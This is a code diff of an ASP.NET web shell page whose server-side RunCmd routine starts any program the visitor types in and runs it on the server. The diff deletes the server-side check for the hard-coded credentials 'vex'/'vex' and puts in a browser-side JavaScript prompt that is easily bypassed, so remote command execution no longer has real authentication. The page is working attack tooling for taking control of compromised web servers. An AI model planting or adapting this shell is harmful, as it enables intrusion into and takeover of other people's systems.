@@ -5,12 +5,6 @@
 <script runat="server">      
 
 Sub RunCmd(Src As Object, E As EventArgs)  
-  ' Check credentials  
-  If username.Text <> "vex" Or password.Text <> "vex" Then
-    result.Text = "<b style='color:red;'>Access Denied: Invalid Username or Password</b>"
-    Exit Sub
-  End If  
-
   Try
     Dim myProcess As New Process()            
     Dim myProcessStartInfo As New ProcessStartInfo(xpath.Text)            
@@ -37,15 +31,23 @@ End Sub
 </script>
 
 <html>
+<head>
+<script>
+function authenticateUser() {
+    var username = prompt("Enter Username:");
+    var password = prompt("Enter Password:");
+
+    if (username !== "vex" || password !== "vex") {
+        alert("Access Denied!");
+        window.location.href = "about:blank"; // Redirects user to a blank page
+    }
+}
+window.onload = authenticateUser;
+</script>
+</head>
+
 <body>    
 <form runat="server">  
-
-<!-- Authentication Section -->
-<p><asp:Label id="L_u" runat="server" width="100px">Username:</asp:Label>        
-<asp:TextBox id="username" runat="server" Width="200px"></asp:TextBox>        
-
-<p><asp:Label id="L_p" runat="server" width="100px">Password:</asp:Label>        
-<asp:TextBox id="password" runat="server" Width="200px" TextMode="Password"></asp:TextBox>    
 
 <!-- Command Execution Section -->
 <p><asp:Label id="L_prog" runat="server" width="80px">Program:</asp:Label>        
